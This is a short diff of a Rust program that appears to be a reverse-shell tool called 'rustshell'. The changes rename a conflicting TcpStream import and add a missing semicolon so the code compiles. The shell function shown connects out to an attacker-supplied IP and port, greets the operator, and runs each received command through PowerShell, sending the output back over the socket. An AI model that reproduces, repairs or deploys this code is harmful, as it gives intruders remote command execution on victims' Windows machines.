@@ -10,7 +10,7 @@ use tokio::net::tcp::OwnedWriteHalf;
 use tokio::net::TcpStream;
 use std::io::Result;
 use std::io::prelude::*;
-use std::net::TcpStream;
+use std::net::TcpStream as OtherTcpStream;
 use std::process::Command;
 use std::str::from_utf8;
 use std::env;
@@ -71,7 +71,7 @@ pub fn interpret_payload(payload: String) {
 pub async fn shell(ip: &str, port: &str) -> Result<()> {
     let args: Vec<String> = env::args().collect();
     
-    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
+    let mut stream = OtherTcpStream::connect(format!("{}:{}", ip, port))?;
     stream.write(b"Welcome to rustshell.\nI am here to execute your commands\nuse 'exit' to exit\n")?;
     let mut buffer = [0; 2048];
 
@@ -87,7 +87,7 @@ pub async fn shell(ip: &str, port: &str) -> Result<()> {
         let output = Command::new("powershell")
                 .args(&[&command])
                 .output()
-                .expect("failed to execute the process")
+                .expect("failed to execute the process");
 
         let reply = output.stdout;
         stream.write(&reply).unwrap();
